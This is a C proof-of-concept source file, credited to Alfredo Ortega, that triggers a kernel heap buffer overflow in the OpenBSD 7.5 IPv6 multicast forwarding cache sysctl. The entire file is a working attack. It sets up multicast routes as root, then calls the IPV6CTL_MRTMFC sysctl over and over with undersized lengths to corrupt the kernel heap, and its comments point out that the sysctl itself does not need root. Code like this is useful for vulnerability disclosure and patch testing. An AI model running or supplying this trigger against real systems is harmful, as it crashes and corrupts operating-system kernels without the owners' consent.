// --- IPV6 Multicast Forwarding Cache Sysctl buffer overflow trigger
// --- Alfredo Ortega @ortegaalfredo
// --- V 01042024
// Note: This trigger requires root access to add MFC rules and massage the heap 
// but the overflow itself is located at the IPV6CTL_MRTMFC sysctl that do NOT require root privileges.
// 
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/sysctl.h>

#include <arpa/inet.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netinet6/ip6_mroute.h>

#include <err.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>

void __dead usage(void);

void __dead
usage(void)
{
	fprintf(stderr,
"IPV6 Multicast Forwarding Cache Sysctl buffer overflow trigger - usage:\n"
"sysctl_mfc6 -i ifname -o outname\n"
"    -i ifname       multicast interface address\n"
"    -o outname      outgoing interface address\n");
	exit(2);
}

/* This value is correct for Openbsd 7.5 */
#define MFC6SIZE 120
void crash(void) {
    int mib[4];
    int r=0;
    int q=0,t;
    unsigned char *buf;
    /* Set up the MIB (Management Information Base) array */
    mib[0] = CTL_NET;
    mib[1] = PF_INET6;
    mib[2] = IPPROTO_IPV6;
    mib[3] = IPV6CTL_MRTMFC;
    
    for(q=1;q<MFC6SIZE*3;q++) {
	    /* Kernel will allocate this len, but will not check if enough to store the MFC6info size */
            size_t len = q;
	    /* We allocate more memory in userland so we don't crash the process */
            buf = calloc(MFC6SIZE*4,sizeof(char));
            /* Retrieve the actual data from kernel space into our buffer and trigger the overflow*/
            if (sysctl(mib, sizeof(mib)/sizeof(mib[0]), buf, &len, NULL, 0) == -1) {
                perror("sysctl");
                exit(EXIT_FAILURE);
            }
	    if (q<len)
		    printf("Overflow: buflen: %d len: %d\n",q,(int)len);
            free(buf);
    }
}


int
main(int argc, char *argv[])
{
	struct mif6ctl mif;
	struct mf6cctl mfc;
	struct mif6info *minfo;
	FILE *log;
	const char *errstr, *file, *group, *ifname, *outname;
	char *buf;
	size_t needed;
	u_int64_t pktin, pktout;
	int value, ch, s, fd, background, norecv;
	unsigned int timeout;
	pid_t pid;
	int mib[] = { CTL_NET, PF_INET6, IPPROTO_IPV6, IPV6CTL_MRTMIF };

	group = "ff04::123";
	ifname = "em0";
	norecv = 0;
	outname = "lo0";
	while ((ch = getopt(argc, argv, "i:o:")) != -1) {
		switch (ch) {
		case 'i':
			ifname = optarg;
			break;
		case 'o':
			outname = optarg;
			break;
		default:
			usage();
		}
	}
	argc -= optind;
	argv += optind;
	if (argc)
		usage();
	printf("Note: This trigger requires root access to add MFC rules and massage the heap\n");
	printf("but the overflow itself is located at the IPV6CTL_MRTMFC sysctl that do NOT require root privileges.\n");
	// Add Multicast route cache rules to a socket trigger the memory corruption
	// This doesn't cause the corruption, but we need multicast route cache so the
	// Sysctl has mf6cinfo entries to cause the overflow
      for(int t=1;t<10000;t++) {
	/* Create target socket*/
	s = socket(AF_INET6, SOCK_RAW, IPPROTO_ICMPV6);
	if (s == -1)
		err(1, "(are you root?) socket");
	value = 1;
	printf("INIT - ");
	if (setsockopt(s, IPPROTO_IPV6, MRT6_INIT, &value, sizeof(value)) == -1)
		err(1, "setsockopt MRT6_INIT");
        /* Add MLD interface Filters */
	memset(&mif, 0, sizeof(mif));
	mif.mif6c_mifi = 0;
	mif.mif6c_pifi = if_nametoindex(ifname);
	if (mif.mif6c_pifi == 0)
		err(1, "if_nametoindex %s", ifname);
	printf("MIF IN - ");
	if (setsockopt(s, IPPROTO_IPV6, MRT6_ADD_MIF, &mif, sizeof(mif)) == -1)
		err(1, "setsockopt MRT6_ADD_MIF %s", ifname);

	memset(&mif, 0, sizeof(mif));
	mif.mif6c_mifi = 1;
	mif.mif6c_pifi = if_nametoindex(outname);
	if (mif.mif6c_pifi == 0)
		err(1, "if_nametoindex %s", outname);
	printf("MIF out - ");
	if (setsockopt(s, IPPROTO_IPV6, MRT6_ADD_MIF, &mif, sizeof(mif)) == -1)
		err(1, "setsockopt MRT6_ADD_MIF %s", outname);
        /* Add MFC6 entry */
	memset(&mfc, 0, sizeof(mfc));
	if (inet_pton(AF_INET6, group, &mfc.mf6cc_mcastgrp.sin6_addr) == -1)
		err(1, "inet_pton %s", group);
	mfc.mf6cc_parent = 0;
	IF_SET(1, &mfc.mf6cc_ifset);
	printf("MFC - ");
	if (setsockopt(s, IPPROTO_IPV6, MRT6_ADD_MFC, &mfc, sizeof(mfc)) == -1)
		err(1, "setsockopt MRT6_ADD_MFC %s", ifname);
	/* Trigger the overflow. We must repeat this many times so the kernel heap get destroyed */
	crash();
	printf("DONE - Repeat\n");
	setsockopt(s, IPPROTO_IPV6, MRT6_DONE, &value, sizeof(value));
       }
}
